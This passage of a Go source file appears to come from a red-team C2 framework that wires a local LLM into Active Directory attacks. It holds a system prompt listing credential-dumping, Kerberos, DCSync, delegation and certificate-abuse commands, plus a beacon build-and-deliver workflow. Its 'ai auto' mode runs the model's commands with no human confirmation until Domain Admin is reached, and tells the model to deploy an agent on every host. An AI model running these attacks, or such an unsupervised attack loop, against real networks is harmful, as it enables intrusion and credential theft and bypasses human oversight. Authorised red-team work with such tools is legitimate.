    dotnet-exec Certify.exe find /vulnerable
    dotnet-exec Certify.exe request /ca:CA /template:TMPL /altname:administrator
    dotnet-exec SharpUp.exe audit
    dotnet-exec SharpView.exe Get-DomainUser -Identity admin

=== LOCAL ATTACK TOOLS (Kali) ===
scan <ip> [-p ports]
enum <ip> [-u u -p p]           SMB/LDAP via netexec
spray <ip> -u list.txt -p pass
asrep <ip> -d dom -u users.txt  AS-REP + john
kerberoast <ip> -d dom -u u -p p
secretsdump <ip> -u u -p p [-d dom]
bloodhound <ip> -d dom -u u -p p
lookupsid <ip> [-u u -p p]
samrdump <ip> -u u [-p p]
rpcdump <ip>
getadusers <ip> -d dom -u u -p p [-all]
getadcomputers <ip> -d dom -u u -p p
finddelegation <ip> -d dom -u u -p p
getlaps <ip> -d dom -u u -p p
gettgt <ip> -d dom -u u [-p p] [-H hash]   → exports KRB5CCNAME
getst <ip> -d dom -u u -spn <spn> [-impersonate admin]
wmiexec <ip> -u u [-p p] [-d dom] ['cmd']  (add cmd for non-interactive)
psexec  <ip> -u u [-p p] [-d dom]
smbexec <ip> -u u [-p p] [-d dom]
mssqlclient <ip> -u u [-p p] [-windows-auth]
dumpntlminfo <ip>
dacledit <ip> -d dom -u u -p p -action write -rights DCSync -principal u -target-dn 'DC=x,DC=y'
rbcd <ip> -d dom -u u -p p -action write -delegate-from EVIL$ -delegate-to TARGET$
addcomputer <ip> -d dom -u u -p p -name EVIL$ -cpass 'Pass!'
changepasswd <ip> -d dom -u u -p p -np newpass
certipy find <ip> -u u@dom -dc-ip <ip> -vulnerable
certipy req <ip> -u u@dom -p p -ca CA -template tmpl -upn admin@dom
certipy auth -pfx file.pfx -dc-ip <ip>
certipy shadow <ip> -u u@dom -p p -account victim -dc-ip <ip> auto
certipy relay -target http://<ca-ip>

=== AGENT DEPLOYMENT (get a real beacon on a pwned host) ===
listener start http <port>
build http <kali_ip> <port> [sleep_sec]
deliver <target_ip> -u <user> -p <pass> -d <domain>
deliver <target_ip> -u <user> -H <nthash> -d <domain>
wait_agent [timeout_sec]

DEPLOYMENT WORKFLOW — use this when you have valid credentials on any Windows host:
  <cmd>listener start http 8080</cmd>
  <cmd>build http <YOUR_KALI_IP> 8080 5</cmd>
  <cmd>deliver <target_ip> -u <user> -p <pass> -d <domain></cmd>
  <cmd>wait_agent 120</cmd>
→ On success wait_agent auto-selects the new agent. Then use shell/token/etc to continue.

=== MANAGEMENT ===
agents          list agents (use first 8 chars of ID)
use <id>        select agent
jobs            list listeners

RULES:
- Pass-the-hash: use -H :NThash (never quote colons in hashes)
- Kerberos: after gettgt, next command can use KRB5CCNAME implicitly
- Deploy an agent on EVERY host where you get admin credentials — do not just run wmiexec interactively
- After getting DA hash from secretsdump: deliver agent to DC, wait_agent, then shell whoami to confirm
- If a command fails, try alternative attack path
- Never repeat the same failed command
- Execute one command at a time, analyze output before proceeding
- Truncated output means the full result was received; proceed based on what you see
- certipy wrapper calls certipy-ad internally — use "certipy find ...", NOT "certipy-ad find ..."
- gettgt syntax: gettgt <dc-ip> -d <domain> -u <user> -p <pass>  (NOT gettgt domain/user:pass)
- finddelegation/getadusers/getadcomputers require explicit -u and -p flags (no interactive prompts)
- dotnet-exec is the C2 in-process CLR command — NEVER call it via "shell dotnet-exec ..."
- All credentials from the LOOT section are available to use — always try them before brute force
- Check UPLOADED ASSEMBLIES in context — only use dotnet-exec with assemblies that are listed there`

const aiChatSystemPrompt = `You are an expert red team operator assistant for Active Directory pentests.
You have access to a C2 framework. Suggest commands using <cmd></cmd> tags — the operator will confirm before execution.

Commands: shell, ls, ps, env, token, scan, enum, spray, asrep, kerberoast, secretsdump, bloodhound, wmiexec, psexec, lookupsid, getadusers, finddelegation, getlaps, gettgt, getst, dacledit, rbcd, addcomputer, changepasswd, certipy find/req/auth/shadow, and more.
Be concise, technical, explain your reasoning.`

// ── ai auto ───────────────────────────────────────────────────────────────

func (cl *CLI) cmdAIAuto(target, domain, model, ollamaURL string) {
	aiActive.Store(1)
	defer aiActive.Store(0)

	// Auto-select active agent
	raw, _ := cl.c.Agents()
	var agents []*server.Agent
	json.Unmarshal(raw, &agents)
	for _, a := range agents {
		if a.Active && !server.IsStale(a) {
			cl.current = a.ID
			break
		}
	}

	agentCtx := cl.aiAgentsList()
	agentNote := "Sin agente activo — solo herramientas locales disponibles."
	if cl.current != "" {
		agentNote = fmt.Sprintf("Agente activo: %s (ID: %s)", func() string {
			for _, a := range agents {
				if a.ID == cl.current {
					priv := "user"
					if a.IsAdmin {
						priv = "ADMIN"
					}
					return a.Username + "@" + a.Hostname + " [" + priv + "]"
				}
			}
			return cl.current[:8]
		}(), cl.current[:8])
	}

	credCtx := cl.aiCredsList()
	uploadsCtx := cl.aiUploadsList()
	targetsCtx := cl.aiTargetsList()

	initialCtx := fmt.Sprintf(`TARGET IP:  %s
DOMAIN:     %s

LISTENERS:
%s
AGENTS (ID · Hostname · User · IP · Transport · OS · Admin):
%s
%s

LOOT — CREDENTIALS IN VAULT:
%s

DISCOVERED TARGETS/NETWORK:
%s

UPLOADED ASSEMBLIES (available for dotnet-exec):
%s`, target, domain, cl.aiJobsList(), agentCtx, agentNote,
		credCtx,
		func() string {
			if targetsCtx == "" {
				return "Ninguno todavía — usar scan para descubrir."
			}
			return targetsCtx
		}(),
		func() string {
			if uploadsCtx == "" {
				return "Ninguno — subir con: upload /tmp/Rubeus.exe"
			}
			return uploadsCtx
		}(),
	)

	msgs := []ollamaMsg{
		{Role: "system", Content: aiAutoSystemPrompt},
		{Role: "user", Content: fmt.Sprintf(
			"INITIAL CONTEXT:\n%s\n\nStart the pentest now. Target: %s domain %s. Achieve Domain Admin.",
			initialCtx, target, domain,
		)},
	}

	fmt.Printf("\n\033[33m╔══════════════════════════════════════════════════════╗\033[0m\n")
	fmt.Printf("\033[33m║  AI AUTO PENTEST — %s  dominio: %-15s   ║\033[0m\n", target, domain)
	fmt.Printf("\033[33m║  Modelo: %-25s  Iters max: %d      ║\033[0m\n", model, aiMaxIter)
	fmt.Printf("\033[33m╚══════════════════════════════════════════════════════╝\033[0m\n\n")

	// Ctrl+C handler
	stop := make(chan struct{})
	sigC := make(chan os.Signal, 1)
	signal.Notify(sigC, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigC
		close(stop)
	}()
	defer signal.Stop(sigC)

	for iter := 1; iter <= aiMaxIter; iter++ {
		// Check stop signal
		select {
		case <-stop:
			fmt.Println("\n\033[31m[AI AUTO] Interrumpido.\033[0m")
			return
		default:
		}

		fmt.Printf("\033[36m┄┄┄┄┄ iter %d/%d ┄┄┄┄┄\033[0m\n", iter, aiMaxIter)
		fmt.Print("\033[90m[AI] razonando...\033[0m")

		response, err := ollamaChat(ollamaURL, model, msgs)
		fmt.Print("\r                        \r")
		if err != nil {
			fmt.Printf("\033[31m[ERROR] %v\033[0m\n", err)
			return
		}

		// Print reasoning (text outside <cmd> tags)
		reasoning := reCmdTag.ReplaceAllString(response, "")
		reasoning = strings.TrimSpace(reasoning)
		if reasoning != "" {
			// Strip <done> block from displayed reasoning text
			reasoning = reDoneTag.ReplaceAllString(reasoning, "")
			fmt.Printf("\033[33m[AI]\033[0m %s\n\n", strings.TrimSpace(reasoning))
		}

		// Done?
		if reDoneTag.MatchString(response) {
			fmt.Printf("\033[32m╔══════════════════════════════════╗\033[0m\n")
			fmt.Printf("\033[32m║  PENTEST COMPLETADO              ║\033[0m\n")
			fmt.Printf("\033[32m╚══════════════════════════════════╝\033[0m\n")
			return
		}

		// Extract and execute commands
		matches := reCmdTag.FindAllStringSubmatch(response, -1)
		if len(matches) == 0 {
			msgs = append(msgs, ollamaMsg{Role: "assistant", Content: response})
			msgs = append(msgs, ollamaMsg{Role: "user", Content: "Continúa con el siguiente paso. Ejecuta un comando."})
			continue
		}

		msgs = append(msgs, ollamaMsg{Role: "assistant", Content: response})

		var resultBuf strings.Builder
		for _, m := range matches {
			cmdLine := strings.TrimSpace(m[1])
			if cmdLine == "" {
				continue
			}

			// Check stop between commands
			select {
			case <-stop:
				fmt.Println("\n\033[31m[AI AUTO] Interrumpido.\033[0m")
				return
			default:
			}

			fmt.Printf("\033[32m[EXEC]\033[0m \033[1m%s\033[0m\n", cmdLine)
			out := cl.aiExec(cmdLine)
			out = truncateOut(out, aiMaxOut)
			if out == "" {
				out = "(sin salida)"
			}
			fmt.Printf("\033[90m%s\033[0m\n", out)
			fmt.Fprintf(&resultBuf, "CMD: %s\nOUT:\n%s\n---\n", cmdLine, out)
		}

		msgs = append(msgs, ollamaMsg{
			Role:    "user",
			Content: resultBuf.String() + "\nAnalyze the results and proceed with the next step toward Domain Admin.",
		})
	}

	fmt.Printf("\n\033[33m[AI AUTO] Alcanzado el máximo de %d iteraciones.\033[0m\n", aiMaxIter)
}

// ── ai chat ───────────────────────────────────────────────────────────────

func (cl *CLI) cmdAIChat(model, ollamaURL string) {
	aiActive.Store(1)
	defer aiActive.Store(0)

	fmt.Printf("\n\033[33m[AI CHAT] Modelo: %s | 'exit' para salir\033[0m\n", model)
	fmt.Printf("\033[33m[AI CHAT] Los comandos se confirman antes de ejecutar\033[0m\n\n")

	msgs := []ollamaMsg{
		{Role: "system", Content: aiChatSystemPrompt},
	}

	// Initial context
	agentsList := cl.aiAgentsList()
	msgs = append(msgs, ollamaMsg{
		Role:    "user",
		Content: "Contexto inicial:\nAgentes:\n" + agentsList + "\nAgente seleccionado: " + func() string {
			if cl.current == "" {
				return "ninguno"
			}
			if len(cl.current) > 8 {
				return cl.current[:8]
			}
			return cl.current
		}(),
	})
	greeting, err := ollamaChat(ollamaURL, model, msgs)
	if err == nil {
		msgs = append(msgs, ollamaMsg{Role: "assistant", Content: greeting})
		fmt.Printf("\033[33m[AI]\033[0m %s\n\n", reCmdTag.ReplaceAllString(greeting, ""))
	}

	cl.rl.SetPrompt("\033[36myou>\033[0m ")
	defer cl.updatePrompt()

	for {
		line, err := cl.rl.Readline()
		if err != nil {
			break
		}
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		if line == "exit" || line == "quit" {
			break
		}

		msgs = append(msgs, ollamaMsg{Role: "user", Content: line})
		fmt.Print("\033[90m[pensando...]\033[0m\n")

		response, err := ollamaChat(ollamaURL, model, msgs)
		if err != nil {
			fmt.Printf("\033[31m[ERROR] %v\033[0m\n", err)
			continue
		}
		msgs = append(msgs, ollamaMsg{Role: "assistant", Content: response})

		// Show reasoning
		reasoning := strings.TrimSpace(reCmdTag.ReplaceAllString(response, ""))
		if reasoning != "" {
			fmt.Printf("\033[33m[AI]\033[0m %s\n", reasoning)
		}

		// Handle proposed commands
		for _, m := range reCmdTag.FindAllStringSubmatch(response, -1) {
			cmdLine := strings.TrimSpace(m[1])
			if cmdLine == "" {
				continue
			}
			fmt.Printf("\n\033[32m[PROPUESTO]\033[0m %s\n", cmdLine)
			cl.rl.SetPrompt("¿Ejecutar? [S/n]: ")
			confirm, _ := cl.rl.Readline()
			cl.rl.SetPrompt("\033[36myou>\033[0m ")

			confirm = strings.ToLower(strings.TrimSpace(confirm))
			if confirm == "" || confirm == "s" || confirm == "y" || confirm == "si" || confirm == "yes" {
				out := cl.aiExec(cmdLine)
				out = truncateOut(out, aiMaxOut)
				if out == "" {
					out = "(sin salida)"
				}
				fmt.Printf("\033[90m%s\033[0m\n", out)

				// Feed result to AI
				msgs = append(msgs, ollamaMsg{
					Role:    "user",
					Content: fmt.Sprintf("Resultado de '%s':\n%s\n\n¿Qué observas? ¿Siguiente paso?", cmdLine, out),
				})
				fmt.Print("\033[90m[analizando...]\033[0m\n")
				analysis, err := ollamaChat(ollamaURL, model, msgs)
				if err == nil {
					msgs = append(msgs, ollamaMsg{Role: "assistant", Content: analysis})
					analysisText := strings.TrimSpace(reCmdTag.ReplaceAllString(analysis, ""))
					if analysisText != "" {
						fmt.Printf("\033[33m[AI]\033[0m %s\n", analysisText)
					}
				}
			} else {
				fmt.Println("[omitido]")
			}
		}
		fmt.Println()
	}

	fmt.Println("\033[33m[AI CHAT] Sesión terminada.\033[0m")
}

// ── cmdAI dispatch ────────────────────────────────────────────────────────

const aiUsage = `uso: ai <subcomando> [opciones]

  Asistente IA integrado con Ollama para análisis y automatización del pentest.

  Requisito: Ollama corriendo en localhost:11434
    Instalar Ollama:  curl -fsSL https://ollama.com/install.sh | sh
    Descargar modelo: ollama pull llama3.1:8b     (recomendado, 4.7GB)
                      ollama pull deepseek-r1:7b  (mejor razonamiento)
                      ollama pull qwen2.5:7b      (alternativa)

subcomandos:
  ai chat  [-m modelo] [-url url]
    Chat interactivo con el asistente IA.
    Propone comandos que tú confirmas antes de ejecutar.

  ai auto  <target> -d <domain> [-m modelo] [-url url]
    Pentest completamente autónomo hasta Domain Admin.
    El agente ejecuta todos los comandos solo, sin confirmación.
    Se detiene cuando logra DA o alcanza el máximo de iteraciones.

opciones:
  -m <modelo>    Modelo Ollama (default: auto-detecta el primero disponible)
  -url <url>     URL de Ollama (default: http://localhost:11434)

servidor Ollama:
  Por defecto usa la variable de entorno OLLAMA_HOST, o localhost:11434.
  export OLLAMA_HOST=http://192.168.31.85:11434   ← servidor remoto con GPU
  export OLLAMA_HOST=http://127.0.0.1:11435        ← puerto alternativo local

modelos recomendados:
  qwen3.6:35b-a3b-nvfp4  Modelo MoE de alto rendimiento (GPU recomendada)
  llama3.1:8b            Buen equilibrio velocidad/calidad
  deepseek-r1:7b         Mejor razonamiento, más lento
  qwen2.5:14b            Mayor contexto

ejemplos:
  ai chat
  ai chat -m qwen3.6:35b-a3b-nvfp4
  ai auto 10.2.20.100 -d cs.org
  ai auto 10.2.20.100 -d cs.org -m qwen3.6:35b-a3b-nvfp4
  ai auto 10.2.20.100 -d cs.org -url http://192.168.31.85:11434`

func (cl *CLI) cmdAI(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 {
		fmt.Println(aiUsage)
		return
	}

	ollamaURL := resolveOllamaURL(flags["url"])

	// Verify Ollama is reachable
	models := ollamaListModels(ollamaURL)
	if models == nil {
		fmt.Printf("\033[31m[!] No se puede conectar a Ollama en %s\033[0m\n", ollamaURL)
		fmt.Println("    Instala Ollama: curl -fsSL https://ollama.com/install.sh | sh")
		fmt.Println("    Inicia Ollama:  ollama serve")
		fmt.Println("    O exporta:      export OLLAMA_HOST=http://<ip>:11434")
		return
	}
	if len(models) == 0 {
		fmt.Printf("\033[31m[!] Ollama conectado (%s) pero sin modelos instalados.\033[0m\n", ollamaURL)
		fmt.Println("    Descarga uno:  ollama pull qwen3.6:35b-a3b-nvfp4")
		fmt.Println("                   ollama pull llama3.1:8b")
		fmt.Println("    Ver modelos:   ollama list")
		return
	}

	// Select model
	model := flags["m"]
	if model == "" {
		model = models[0]
		fmt.Printf("[*] Ollama: %s  |  modelo: %s\n", ollamaURL, model)
		if len(models) > 1 {
			fmt.Printf("[*] Otros disponibles: %s\n", strings.Join(models[1:], ", "))
		}
	}

	sub := pos[0]
	switch sub {
	case "chat":
		cl.cmdAIChat(model, ollamaURL)

	case "auto":
		if len(pos) < 2 || flags["d"] == "" {
			fmt.Println("uso: ai auto <target> -d <domain> [-m model] [-url url]")
			fmt.Println("ej:  ai auto 10.2.20.100 -d cs.org -m llama3.1:8b")
			return
		}
		cl.cmdAIAuto(pos[1], flags["d"], model, ollamaURL)

	default:
		fmt.Printf("[!] subcomando desconocido: %s\n\n", sub)
		fmt.Println(aiUsage)
	}
}
